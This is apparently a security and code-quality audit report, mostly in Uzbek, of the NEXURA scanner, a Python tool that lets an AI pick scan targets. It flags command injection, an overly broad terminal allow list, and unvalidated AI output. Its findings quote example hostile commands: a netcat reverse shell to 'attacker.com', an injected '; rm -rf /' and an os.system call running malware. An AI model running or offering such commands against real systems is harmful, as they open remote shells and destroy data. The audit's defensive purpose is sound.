# NEXURA Scanner — Senior Audit Report

> Barcha fayllar (37 ta `.py` fayl) chuqur analiz qilindi.
> Har bir topilma: **CRITICAL** / **HIGH** / **MEDIUM** / **LOW** / **INFO** darajasiga ajratilgan.

---

## 1. CRITICAL — Security & Safety

### 1.1 `web_app.py` / `app.py.bak` — `shell=True` bilan ishlatilgan **Command Injection**
**Fayl:** `web_app.py:157`, `app.py.bak:42`  
**Muammo:** `subprocess.run(cmd, shell=True, ...)` — `cmd` foydalanuvchi kiritgan input bilan to'ldiriladi. `shell=True` bo'lgani uchun `; rm -rf /` yoki `|` kabi injeksiyalar ishlaydi.
**Fix:** `shell=True` ni o'chirish yoki inputni sanitize qilish.

### 1.2 `web_app.py` / `nexura/web/app.py` — Terminal API orqali **arbitrary command execution**
**Fayl:** `nexura/web/app.py:330-345`, `web_app.py:52-67`  
**Muammo:** Allow list bor (`ALLOWED_TERMINAL_COMMANDS`), lekin `nmap`, `sqlmap`, `python`, `node`, `docker`, `kubectl`, `ssh`, `nc`, `wmic`, `sc` kabi xavfli tool'lar ham ruxsat etilgan. Masalan `nc -e /bin/bash attacker.com 4444` yoki `python -c 'import os; os.system("malware")'`.
**Fix:** Allow list ni qattiqroq qilish yoki terminal funksiyasini butunlay olib tashlash.

### 1.3 `nexura/web/app.py` — **CORS `allow_origins=["*"]`**
**Fayl:** `nexura/web/app.py:41`  
**Muammo:** Barcha originlarga ruxsat berilgan. API key bo'lsa ham, CORS bilan birga bu xavfli.
**Fix:** Production'da aniq origin ko'rsatish kerak.

### 1.4 `nexura/cve_lookup.py` — **Async client sync methodlarda ishlatilgan**
**Fayl:** `nexura/cve_lookup.py:47` → `self._client = httpx.AsyncClient(...)` keyin `lookup_by_service_sync` da `with httpx.Client() as client` bilan boshqa client ochiladi.   
**Muammo:** `AsyncClient` hech qachon to'g'ri yopilmaydi (faqat shutdown'da). `lookup_by_cve_sync` `lookup_by_service_sync` dan foydalanilganda ikkita alohida client ochiladi.
**Fix:** Yagona `httpx.Client` sync uchun, alohida `AsyncClient` async uchun.

---

## 2. HIGH — Architecture & Logic

### 2.1 `nexura/runner.py:60-68` — NETWORK tool **bypasses parser completely**
**Fayl:** `nexura/runner.py:60-68`  
**Muammo:** `tool == ToolType.NETWORK` bo'lganda `ScanRunner.run()` direkt `NetworkScanner().quick_scan()` chaqiradi, parser (va CVE enrichment)ni butunlay chetlab o'tadi. Shuning uchun `nexura/parsers/network.py` dagi barcha qo'shilgan port/protocol/PID filter imkoniyatlari ishlatilmaydi.
**Fix:** `run()` methodida NETWORK uchun ham parser dan o'tkazish kerak.

### 2.2 `nexura/tool_selector.py:82-99` — AI output'dan kelgan `target` **hech qachon validate qilinmaydi**
**Fayl:** `nexura/tool_selector.py:82`  
**Muammo:** `scan_target = data.get("target", target or "unknown")` — AI "target" field'iga `"; rm -rf /"` yoki boshqa zararli qiymat qaytarsa, u to'g'ridan-to'g'ri args ga qo'yiladi (line 94: `args = [a.replace("<target>", scan_target)`). Hech qanday validation yo'q.
**Fix:** `_validate_target()` ni AI dan kelgan target'ga ham qo'llash kerak.

### 2.3 `nexura/ai_engine.py:56-69` — `ask()` methodida **hech qanday timeout yo'q**
**Fayl:** `nexura/ai_engine.py:56`  
**Muammo:** `self._llm.create_chat_completion(...)` — LLM modeli blokirovka bo'lib qolsa yoki juda sekin javob qaytarsa, butun dastur osilib qoladi. `ask_with_timeout` alohida method sifatida mavjud, lekin asosiy `ask()` va `ask_structured()` da ishlatilmaydi.
**Fix:** Barcha `ask()` call'larida default timeout mexanizmini qo'llash.

### 2.4 `nexura/ai_engine.py:61-68` — `ask_with_timeout` **har safar yangi ThreadPoolExecutor ochadi**
**Fayl:** `nexura/ai_engine.py:74`  
**Muammo:** Har bir timeout'li so'rovda yangi `ThreadPoolExecutor` yaratiladi va ishlatilgandan keyin garbage collectorga tashlanadi. Resurs leaks.
**Fix:** `self._executor` ni qayta ishlatish.

### 2.5 `nexura/web/app.py:80-81` — Shutdown'da `asyncio.new_event_loop()` yaratilgan
**Fayl:** `nexura/web/app.py:80`  
**Muammo:** `asyncio.new_event_loop()` + `loop.run_until_complete(...)` synchronous shutdown ichida. FastAPI shutdown event'i allaqachon event loop ichida ishlaydi, bu redundant va `RuntimeError` berishi mumkin.
**Fix:** To'g'ridan-to'g'ri `await app.state.cve_lookup.close()` ishlatish (agar handler async bo'lsa).

### 2.6 `nexura/parsers/network.py` — **duplicated service mapping**
**Fayl:** `nexura/parsers/network.py:203-212`  
**Muammo:** `_service_by_port()` dict'i `nexura/scanners/network.py:23-31` dagi `WELL_KNOWN_SERVICES` bilan bir xil. Ikkala joyda alohida saqlanadi — birini o'zgartirsang ikkinchisi eski qoladi.
**Fix:** Bitta central mapping yaratish yoki bir joydan import qilish.

### 2.7 `nexura/web/app.py:144-145` — Technology detection **hardcoded https://** prefiks
**Fayl:** `nexura/web/app.py:144`  
**Muammo:** `f"https://{plan.target}"` — agar target `http://example.com` yoki `example.com:8080` bo'lsa, URL noto'g'ri bo'ladi. Masalan: `https://http://example.com` yoki `https://example.com:8080` (ikkinchisi to'g'ri lekin port 443 ga emas 8080 ga ketadi).
**Fix:** Avval target'da protocol borligini tekshirish.

---

## 3. MEDIUM — Code Quality & Maintainability

### 3.1 `nexura/ai_engine.py:115-177` — **SYSTEM_PROMPT massive string**
**Muammo:** 60+ qatorlik system prompt `ai_engine.py` faylining o'zida hardcode qilingan. Prompt'ni o'zgartirish uchun kodga o'zgartirish kiritish kerak.
**Fix:** Prompt'larni alohida `.txt` yoki `.yaml` faylga ko'chirish.

### 3.2 `nexura/cve_lookup.py` — **89% code duplication** sync va async methodlar o'rtasida
**Fayl:** `nexura/cve_lookup.py:55-89` vs `nexura/cve_lookup.py:123-154`  
**Muammo:** `_cve_circl_lookup` (async) va `_cve_circl_lookup_sync` (sync) deyarli bir xil kod. Faqat `await` va `async with` farqi.
**Fix:** DRY — sync method async ni wrapper orqali chaqirishi mumkin (`asyncio.run()`), yoki aksincha.

### 3.3 `nexura/history_db.py:84-99` — `_get_conn()` **connection healing** murakkab va redundant
**Muammo:** Har safar `_get_conn()` chaqirilganda `SELECT count(*) FROM sessions` execute qilinadi (connection tekshirish uchun). Bu ortiqcha round-trip.
**Fix:** SQLite connection pooling yoki oddiyroq `try/except` mexanizmi.

### 3.4 `nexura/history_db.py:104` — **BEGIN** ishlatilgan, lekin `conn.autocommit` default True
**Muammo:** SQLite'da default `autocommit=True`. `conn.execute("BEGIN")` dan keyin `conn.commit()` ishlaydi, lekin `rollback()` uchun interleaved mode'ga o'tish kerak. Bu noto'g'ri transaction handling'ga olib kelishi mumkin.
**Fix:** `conn.isolation_level = "DEFERRED"` yoki context manager bilan transaction boshqaruvi.

### 3.5 `nexura/scanners/network.py:58` — `as_completed` **order** noaniq
**Muammo:** `as_completed` birinchi tugagan taskni qaytaradi, lekin `open_ports.append(...)` order'ini saqlamaydi. Portlar tartibsiz chiqadi.
**Fix:** `quick_scan` natijasini tartiblash.

### 3.6 `nexura/report/generator.py:62-63` — `hasattr(report, "technologies")` — **Pydantic model'da attribute yo'q**
**Fayl:** `nexura/report/generator.py:62`  
**Muammo:** `ScanReport` modelida `technologies` field'i yo'q. `hasattr` orqali tekshirish noaniq.
**Fix:** `ScanReport` ga `technologies: dict | None = None` field qo'shish yoki alohida parametr sifatida uzatish.

### 3.7 `nexura/cli.py:72` — `click.confirm("\nDavom etamizmi?")` **interaktiv rejim**
**Muammo:** CLI scan buyrug'i interaktiv confirmation talab qiladi. CI/CD pipeline'da yoki skriptlarda ishlamaydi.
**Fix:** `--yes` flag qo'shish.

### 3.8 `nexura/web/app.py:49-51` — API key **log'lanadi**
**Muammo:** `_API_KEY = os.getenv("NEXURA_API_KEY", "")` va agar mavjud bo'lsa `logger.warning(...)`. Logda API key borligi ko'rinadi (lekin o'zi ko'rinmaydi), bu security risk.
**Fix:** Secret'larni log'lamaslik.

---

## 4. LOW — Minor Issues

### 4.1 `nexura/web/app.py:256-273` — `get_report` **JSON fayllarni scan qiladi**
Har safar report so'ralganda `reports_dir.glob("*.json")` bilan barcha fayllarni ochib o'qiydi. Katta hajmdagi reports bilan sekinlashadi.

### 4.2 `nexura/parsers/sqlmap.py:len()` — SQLMap parser'ida `taskdata` kaliti hardcode
CIRCL API'sining response structurasi o'zgarishi mumkin, hozirgi `taskdata` va `data` kalitlariga bog'liqlik zaif.

### 4.3 `nexura/parsers/nmap.py` — XML parser `lxml` talab qilmaydi, lekin fallback `etree` ishlatadi
XML namespace handling qilmaydi. Agar nmap kelajakda namespace qo'shsa, parser ishlamay qoladi.

### 4.4 `tests/test_parsers.py:1-4` — Faqat 4 ta parser test qilingan
`parse_amass`, `parse_sqlmap`, `parse_network` testlari yo'q.

### 4.5 `config.json` — **API key bo'sh string**
`"api_key": ""` default. Foydalanuvchi hech qachon API key kiritmasa, config.json dan foydalaniladi va hech qanday xatolik chiqmaydi — faqat AI chat ishlamaydi.

### 4.6 `nexura/scanners/network.py:214-216` — SSL expiry check noto'g'ri
`datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")` — `%Z` timezone nomini parse qilmaydi (PEP 615). `notAfter` field'i `May 31 23:59:59 2026 GMT` formatida bo'ladi. `strptime` `GMT` ni parse qilolmaydi.
**Fix:** `dateutil.parser` yoki manual mapping ishlatish.

### 4.7 `scripts/setup_linux.sh:35` — `requirements.txt` **mavjud emas**
Skript `pip3 install -q -r requirements.txt` chaqiradi, lekin bunday fayl yo'q. `pyproject.toml` ishlatilishi kerak.

### 4.8 `start.bat` — `venv\Scripts\python.exe` hardcode
Virtual environment yo'li hardcode qilingan. Boshqa machine'da ishlamaydi.

---

## 5. INFO — Suggestions & Improvements

### 5.1 `PARSER_MAP` class variable orqali lazy initialization
`runner.py:32` da `PARSER_MAP = {}`, keyin `_init_parser_map` chaqiriladi. Oddiy dict bo'lishi mumkin edi.

### 5.2 `Agentic scan`da `used_tools` set'i args bo'yicha unique tekshiradi
`tool_selector.py:155`: `f"{tool_name}:{','.join(args)}"` — agar args order'i o'zgersa, bir xil tool boshqa hisoblanadi.

### 5.3 `py.typed` fayli mavjud (PEP 561)
Yaxshi, lekin hech qanday `__init__.py` da `__all__` to'liq emas.

### 5.4 `ruff` konfiguratsiyasida `target-version = "py310"`
`pyproject.toml` da `requires-python = ">=3.10"`. Lekin kodda `| None` (PEP 604 union syntax) ishlatilgan, bu Python 3.10+ da ishlaydi. Biroq `py.typed` bilan typing strictness yaxshi.

### 5.5 `xatolik` va `topilmadi` kabi o'zbekcha error messages
CLI va loglarda o'zbekcha va inglizcha aralash. Bir til standard'ga keltirish kerak.

### 5.6 `web_app.py` (Flask) va `nexura/web/app.py` (FastAPI) parallel
Ikkala web framework parallel ishlatilgan. Flask versiyasi `DEPRECATED` deb belgilangan, lekin `start.bat` hali `web_app.py` ni chaqiradi (FastAPI emas).

---

## Audit Summary

| Severity | Count | Key Findings |
|----------|-------|--------------|
| **CRITICAL** | 4 | Command injection (`shell=True`), arbitrary command execution, CORS wildcard, async client leak |
| **HIGH** | 7 | NETWORK bypasses parser, AI target validation missing, no timeout in AI calls, ThreadPool leak, shutdown event loop, duplicated service map, tech detection URL |
| **MEDIUM** | 8 | Hardcoded prompts, 89% code duplication, SQLite connection overhead, transaction handling, port ordering, technologies field, CLI not non-interactive, API key log |
| **LOW** | 8 | JSON file scanning, parser test coverage, old Flask in start.bat, SSL date parsing, missing requirements.txt, venv hardcode, config.json defaults, XML namespace |
| **INFO** | 6 | PARSER_MAP init, agentic dedup, typing, ruff target, mixed language, dual web frameworks |

**Jami: 33 ta topilma**
